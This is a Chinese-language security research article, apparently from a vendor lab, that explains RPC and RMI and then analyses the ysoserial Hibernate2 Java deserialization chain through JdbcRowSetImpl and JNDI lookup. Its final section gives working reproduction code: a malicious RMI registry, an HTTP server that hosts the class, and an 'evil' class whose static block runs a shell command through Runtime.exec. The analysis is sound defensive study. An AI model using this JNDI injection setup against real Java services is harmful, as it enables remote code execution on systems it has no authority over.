**作者：天融信阿尔法实验室**  
**原文链接：<https://mp.weixin.qq.com/s/EeDpAP2n3RZ-3EYTET27nw>**  
**相关文章：[Java 反序列化系列 ysoserial Hibernate1](https://paper.seebug.org/1187/ "Java
反序列化系列 ysoserial Hibernate1")**

## 1.Hibernate简介

Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的ORM框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。
Hibernate可以应用在任何使用JDBC的场合，既可以在Java的客户端程序使用，也可以在Servlet/JSP的Web应用中使用，最具革命意义的是，Hibernate可以在应用EJB的JaveEE架构中取代CMP，完成数据持久化的重任。

## 2.RPC简介

RPC(Remote Procedure Call)远程过程调用。允许一台计算机程序远程调用另外一台计算机的子程序，不用关心底层网络通信。

很多人对RPC的概念很模糊，其实RPC是建立在Socket的基础上的。通过Socket将对另一台计算机中的某个类的某个方法的请求同时包含该方法所需要传输的参数序列化传输过去，然后在另一台计算机接收后判断具体调用的哪个类的哪一个方法，然后通过反射调用该方法并传入参数，最终将方法的返回值序列化并通过Socket传输回发送方法调用请求的那台计算机上，这样的一个过程就是所谓的远程方法调用

一次RPC调用的过程大概有10步：

1.执行客户端调用语句，传送参数

2.调用本地系统发送网络消息

3.消息传送到远程主机

4.服务器得到消息并取得参数

5.根据调用请求以及参数执行远程过程（服务）

6.执行过程完毕，将结果返回服务器句柄

7.服务器句柄返回结果，调用远程主机的系统网络服务发送结果

8.消息传回本地主机

9.客户端句柄由本地主机的网络服务接收消息

10.客户端接收到调用语句返回的结果数据

以下是一张截取自网上的RPC执行流程图

![](https://images.seebug.org/content/images/2020/05/f81c4e9c-df32-4616-91c5-be2e8405e64a.png-w331s)

接下来通过java代码来实现一个最简化的RPC Demo

先看一下文件结构首先是client端也就是发起远程方法请求的一方

![](https://images.seebug.org/content/images/2020/05/e1ea3653-010d-4dd1-9156-9dc730a4a2cf.png-w331s)

然后是server端也就是处理远程方法请求的一方

![](https://images.seebug.org/content/images/2020/05/e795cd72-ac2d-412a-b88f-5233b865a1db.png-w331s)

首先看RpcPrincipleTestInterface接口，此接口是公开的，也就是这个接口文件是client端和server端中都存在的，接下来是RpcPrincipleTestInterface的代码

    
    
    import java.io.Serializable;
    
    public interface RpcPrincipleTestInterface extends Serializable {
    
        public int myAdd(int firstNum, int SecondNum);
    
        public int mySub(int firstNum, int SecondNum);
    
        public String sayHello(String name);
    }

然后我们观察client端的RpcPrincipleClientTestimpl.java

    
    
    public class RpcPrincipleClientTestimpl {
        public static void main(String[] args)throws Exception {
            RpcPrincipleTestInterface rpcPrincipleTestInterface = (RpcPrincipleTestInterface)Stub.getStub();
    
            int resultOne = rpcPrincipleTestInterface.myAdd(2,3);
    
            System.out.println(resultOne+"\n");
    
            int resultTwo = rpcPrincipleTestInterface.mySub(5,4);
    
            System.out.println(resultTwo+"\n");
    
            String resultThree = rpcPrincipleTestInterface.sayHello("张三");
    
            System.out.println(resultThree+"\n");
        }
    }

下面是执行结果

![](https://images.seebug.org/content/images/2020/05/7fe0b4d4-0c6a-45be-ba79-9750fc8dc015.png-w331s)

可以看到我们执行了RpcPrincipleTestInterface接口中的方法但是我们在本地并未有任何RpcPrincipleTestInterface接口的具体实现？那这些个执行结果究竟是谁给出的呢？

我们通过观察代码不难发现，为rpcPrincipleTestInterface变量赋值的是`Stub.getStub()`方法，该方法的返回值被我们强转成了`RpcPrincipleTestInterface`类型。那`Stub.getStub()`方法的返回值究竟是什么我们继续深入来看

下面是Stub.java的代码

    
    
    public class Stub {
        public static Object getStub(){
            InvocationHandler h = new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    Socket socket = new Socket("127.0.0.1",8888);
    
                    String methodName = method.getName();
                    if(methodName.equals("myAdd")||methodName.equals("mySub")){
                        Class[] parameterType = method.getParameterTypes();
                        ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());
                        outputStream.writeUTF(methodName);
                        outputStream.writeObject(parameterType);
                        outputStream.writeObject(args);
                        outputStream.flush();
                        //outputStream.close();
    
                        DataInputStream inputStream = new DataInputStream(socket.getInputStream());
                        int result = inputStream.readInt();
                        inputStream.close();
                        return result;
    
                    }else if (methodName.equals("sayHello")){
                        Class[] parameterType = method.getParameterTypes();
                        ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());
                        outputStream.writeUTF(methodName);
                        outputStream.writeObject(parameterType);
                        outputStream.writeObject(args);
                        outputStream.flush();
    
                        DataInputStream inputStream = new DataInputStream(socket.getInputStream());
                        String result = inputStream.readUTF();
    
                        return result;
                    }else {
                        System.out.println("请确认你调用的方法是否存在");
                        return null;
                    }
    
                }
            };
            Object object = Proxy.newProxyInstance(RpcPrincipleTestInterface.class.getClassLoader(),new Class[]{RpcPrincipleTestInterface.class},h);
            return object;
        }
    }

不难看出最终返回的结果是一个实现了RpcPrincipleTestInterface接口的动态生成的Proxy对象，传入的handler参数中包含了调用远程方法的核心操作。

首先熟悉java动态代理的同学都清楚，当我们调用动态代理对象的某个方法时，其实都是在调用InvocationHandler对象中被重写的invoke方法。所以当我们在`RpcPrincipleClientTestimpl中调用rpcPrincipleTestInterface.myAdd()`方法时本质调用的是`InvocationHandler.invoke`方法。同时方法名“myAdd”作为参数传入invoke中，我们首先创建一个socket对象将请求的地址和端口作为参数传入。然后获取方法名，接下来判断当前调用的方法是哪一个，判断完成后，将方法名，参数类型，还有参数的值序列化发送给server端，然后通过DataInputStream读取socket接收到的数据并反序列化，然后进行返回。

讲完了client端，我们再来看看server端，首先来看RpcPrincipleTestImpl.java的代码

    
    
    public class RpcPrincipleTestImpl implements RpcPrincipleTestInterface {
    
        private static final long serialVersionUID = 8084422270826068537L;
    
        @Override
        public int myAdd(int firstNum,int SecondNum) {
            return firstNum + SecondNum;
        }
    
        @Override
        public int mySub(int firstNum,int SecondNum) {
            return firstNum - SecondNum;
        }
    
        @Override
        public String sayHello(String name) {
            return name+"Say Hello";
        }
    
    }

我们看到RpcPrincipleTestInterface接口真正的实现类是RpcPrincipleTestImpl，那刚才我们究竟是怎么做到在client端调用了server端的RpcPrincipleTestImpl的呢？关键在于RpcPrincipleServerSkeleton这个类，我们观察下他的源码

    
    
    public class RpcPrincipleServerSkeleton {
        private static boolean running = true;
    
        public static void main(String[] args) throws Exception {
            ServerSocket serverSocket = new ServerSocket(8888);
            while (running){
                Socket s = serverSocket.accept();
                process(s);
                s.close();
            }
            serverSocket.close();
        }
    
        private static void process(Socket s)throws Exception{
            InputStream in = s.getInputStream();
            OutputStream out = s.getOutputStream();
            ObjectInputStream ois= new ObjectInputStream(in);
    
            String methodName = ois.readUTF();
            Class[] parameterType = (Class[])ois.readObject();
            Object[] args =(Object[]) ois.readObject();
    
            RpcPrincipleTestInterface rpcPrincipleTestInterface = new RpcPrincipleTestImpl();
            Method method = rpcPrincipleTestInterface.getClass().getMethod(methodName,parameterType);
            Type t = method.getAnnotatedReturnType().getType();
            if(t.getTypeName().equals("int")){
                int result = (int)method.invoke(rpcPrincipleTestInterface,args);
                DataOutputStream output = new DataOutputStream(out);
                output.writeInt(result);
                output.flush();
            }else if(t.getTypeName().equals("java.lang.String")){
                String result = (String) method.invoke(rpcPrincipleTestInterface,args);
                DataOutputStream output = new DataOutputStream(out);
                output.writeUTF(result);
                output.flush();
            }
        }
    }

在RpcPrincipleServerSkeleton中我们首先监听了8888端口，然后将Socket对象传入process方法中。process方法中接收客户端传的，调用方法的方法名，参数类型，以及参数值。按顺序将其反序列化出来然后通过反射调用RpcPrincipleTestImpl对象中的对应方法，然后将得到的返回值进行类型的判断，紧接着就将其进行序列化然后通过socket返回給client端，至此就是一个RPC的基础流程，我在这里演示的RPC
demo可以说是简陋，真实的RPC框架背后的实现要比这复杂n倍，但是复杂归复杂，原理都是一样的。

## 3.RMI简介

介绍完了RPC，接下来就介绍一下RPC框架的一种实现，也就是RMI，直接通过代码来进行演示

先看一下远程方法调用方，也就是client端的目录结构

![](https://images.seebug.org/content/images/2020/05/a0ea1bfa-7e05-4608-afb7-a57dcd8cc017.png-w331s)

然后是远程方法服务提供方，也就是server端

![](https://images.seebug.org/content/images/2020/05/ee86aded-a0f4-4e80-b2a0-d90d5a41a119.png-w331s)

RMITestInterface是一个公开接口，就像上一节所讲的，底层生成的代理类是需要实现该接口的,此公共接口一定要继承java.rmi.Remote接口，否则编译时会报错，以下是RMITestInterface的代码,

    
    
    public interface RMITestInterface extends Remote {
        public String sayHello(String name)throws RemoteException;
    }

我们在RMIClientTest类中发起远程方法调用的请求，以下是RMIClientTest的代码

    
    
    public class RMIClientTest {
        public static void main(String[] args) {
            try{
               /** Registry registry = LocateRegistry.getRegistry("localhost",1099);
                RMITestInterface rmiTestInterface = (RMITestInterface) registry.lookup("RMIClientTestImpl");*/
                RMITestInterface rmiTestInterface = (RMITestInterface) Naming.lookup("rmi://localhost:1099/RMITestInterfaceImpl");
                /**Naming.lookup帮忙封装了上面的两个步骤，将两步合成一步了，原本要写两行代码现在只要一行就行了*/
                System.out.println(rmiTestInterface.sayHello("World"));
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }

接下来就是server端的代码，首先我们看RMITestInterfaceImpl，可以看到该类实现了RMITestInterface接口，同时同学们应该也注意到该类继承了一个UnicastRemoteObject类，在RMI中如果一个类要绑定进行远程方法提供的话有两种方法，一就是继承UnicastRemoteObject类，第二种就是在实例化时通过调用`UnicastRemoteObject.exportObject()`静态方法来实例化该对象。

    
    
    public class RMITestInterfaceImpl extends UnicastRemoteObject implements RMITestInterface {
    
        private static final long serialVersionUID = -6151588688230387192L;
        public int num = 1;
    
        protected RMITestInterfaceImpl() throws RemoteException {
            super();
        }
    
        @Override
        public String sayHello(String name) throws RemoteException {
            return "Hello" + name + "^_^";
        }
    }

最后我们来看RMIServerTestImpl类，在该类里我们绑定了一个RMITestInterface对象来进行提供远程方法调用的服务

    
    
    public class RMIServerTestImpl {
    
        public static void main(String[] args) {
            try {
                RMITestInterface rmiTestInterface = new RMITestInterfaceImpl();
                LocateRegistry.createRegistry(1099);
                Naming.rebind("rmi://localhost:1099/RMITestInterfaceImpl",rmiTestInterface);
                System.out.println("Ready");
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }

最后我们在client端执行RMIClientTest可得到以下结果

![](https://images.seebug.org/content/images/2020/05/11851f32-caa1-44ba-8594-2c95dcaa4950.png-w331s)

## 4.Hibernate2漏洞原理深度分析

整体漏洞的执行逻辑同Hibernate1并无太大差别，首先看一下ysoserial
Hibernate封装恶意代码的逻辑，这次还是用了和上次一样的脑图，对其中利用到的不同的类进行了修改

![](https://images.seebug.org/content/images/2020/05/f8a867b1-df8a-441d-9a78-e0faf29fcde2.png-w331s)

除了一开始被封装而且是用来最终执行代码的TemplatesImpl类变成了JdbcRowSetImpl类以外几乎没有什么变化了，也就是说前期的执行调用链是一样的。

为了方便大家理解就再把执行过程从头简述一遍。

首先反序列化我们最终封装完成的HashMap对象，自然会调用HashMap的readObject()方法,然后在readObject()方法的末尾有一个for循环，

![](https://images.seebug.org/content/images/2020/05/c4bf725d-2a0a-4869-9854-44e9b4625284.png-w331s)

由脑图可知这里的key和value对象存储的是同一个Type对象

![](https://images.seebug.org/content/images/2020/05/ae0f93ed-edf5-4937-988d-1a5a350fda2d.png-w331s)

![](https://images.seebug.org/content/images/2020/05/18db566f-69c3-4cea-9867-cfda6e81930f.png-w331s)

接下来在`putForCreate()`方法里又调用的`hash()`方法

![](https://images.seebug.org/content/images/2020/05/beebdb7f-c3ff-41e5-a8b9-63d7c3a3f092.png-w331s)

最终嵌套执行到BasicPropertyAccessor$BasicGetter的get()方法。

![](https://images.seebug.org/content/images/2020/05/ae4fd073-2b1b-4ef5-bf86-285c7dc9e309.png-w331s)

这里调用了Method.invoke方法，我们看一下method变量和target的具体信息

![](https://images.seebug.org/content/images/2020/05/355bbe29-7b18-4318-a01a-d7b072115e33.png-w331s)

可以看到最终通过反射的方式调用了`JdbcRowSetImpl.getDatabaseMetaData()`方法,漏洞触发真正的重点从这里才开始和ysoserial
Hibernate1有所不同。

我们跟进getDatabaseMetaData()方法，看到该方法同时调用了自身的connect方法，我们继续跟进

![](https://images.seebug.org/content/images/2020/05/ca602967-3f99-42f1-a292-be3febebecaf.png-w331s)

`Var1.lookup(this.getDataSourceName()`就是触发远程代码执行的罪魁祸首

![](https://images.seebug.org/content/images/2020/05/0a474a37-8d8b-4ee3-ae79-36107747d21f.png-w331s)

但这么说大家肯定有人会不理解，为何这个函数会造成代码执行。

首先我们先看这个var1，var1是一个InitialContext对象，存在于javax.naming这个包中

![](https://images.seebug.org/content/images/2020/05/4e14050e-cb7d-4172-8ef0-59ee21627cb8.png-w331s)

那么javax.naming这个包又是干什么的？我们百度一下就可以知道，这个包就是我们常听到的一个概念JNDI

关于JNDI的基础概念就不再过多赘述了

正如第3节内容所讲的RMI远程方法调用一样，JNDI功能中的一部分就是帮我们又封装了一下RMI，从而可以让我们更方便的实现远程方法调用。

下面用代码来复现这个漏洞的原理

首先是jndi client端

    
    
    public class JndiClientTest {
        public static void main(String[] args) throws NamingException {
            Context ctx = new InitialContext();
            ctx.lookup("rmi://127.0.0.1:9999/evil");
            System.out.println(System.getProperty("java.version"));
        }
    }

然后是一个恶意server端

    
    
    public class RMIServer1 {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(9999);
            System.out.println("java RMI registry created. port on 9999...");
            Reference reference = new Reference("ExportObject", "com.test.remoteclass.evil", "http://127.0.0.1:8000/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
        }
    }

紧接着是一个用来提供恶意类加载的一个简易http Server

    
    
    public class HttpServer implements HttpHandler {
        @Override
        public void handle(HttpExchange httpExchange) {
            try {
                System.out.println("new http request from " + httpExchange.getRemoteAddress() + " " + httpExchange.getRequestURI());
                InputStream inputStream = HttpServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                while (inputStream.available() > 0) {
                    byteArrayOutputStream.write(inputStream.read());
                }
    
                byte[] bytes = byteArrayOutputStream.toByteArray();
                httpExchange.sendResponseHeaders(200, bytes.length);
                httpExchange.getResponseBody().write(bytes);
                httpExchange.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        public static void main(String[] args) throws IOException {
            com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(8000), 0);
    
            System.out.println("String HTTP Server on port: 8000");
            httpServer.createContext("/", new HttpServer());
            httpServer.setExecutor(null);
            httpServer.start();
        }
    }

最后就是我们包含有恶意代码的类了

    
    
    public class evil implements ObjectFactory, Serializable {
        private static final long serialVersionUID = 4474289574195395731L;
        static {
            try {
                exec("open /Applications/Calculator.app");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void exec(String cmd) throws Exception {
            String sb = "";
            BufferedInputStream in = new                BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
            in.close();
        }
        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
            return null;
        }
    }

可以看到在静态代码块中写有我们要执行的命令

我们先启动server端和http server。然后运行client端就可以出发命令执行

![](https://images.seebug.org/content/images/2020/05/06755a54-6c18-43f5-bc0e-53fe14b7e3e0.png-w331s)

这是为什么呢？在第三节中我们简单介绍了RMI，RMI可以进行远程方法调用，RMI还可以进行动态类加载，即可以从一个远程服务器`http://`、`ftp://`、`file://`等形式动态加载一个.class文件到本地然后进行操作。但是这种RMI动态类加载的限制极大。有以下要求

  1. 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。

  2. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。

我们使用JNDI同样可以进行动态类加载，而且限制相比于使用RMI要小很多。在jdk1.7.0_21版本我们可以不做任何配置直接进行远程class的加载。

但当jdk版本大于等于JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性
com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类。

我们更换jdk版本演示一下，可以看到jdk版本为`1.8.0._22`时会抛出`com.sun.jndi.rmi.object.trustURLCodebase`
为flase的异常

![](https://images.seebug.org/content/images/2020/05/c5559279-398c-4575-b57c-696c16e89703.png-w331s)

至此 ysoserial Hibernate2 漏洞原理分析完毕，感谢观看。

## 5.总结

此次漏洞利用的思路相较于之前的Hibernate1
主要变化在最终触发命令执行的类由TemplatesImpl类变成了JdbcRowSetImpl类，最终执行漏洞方式又由加载本地通过动态字节码生成的类从而触发其静态代码块中的恶意代码换成了通过RMI+JNDI+Reference,
然后最终由`lookup()`方法动态加载一个远程class文件从而触发其静态代码块中的恶意代码。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1199/>

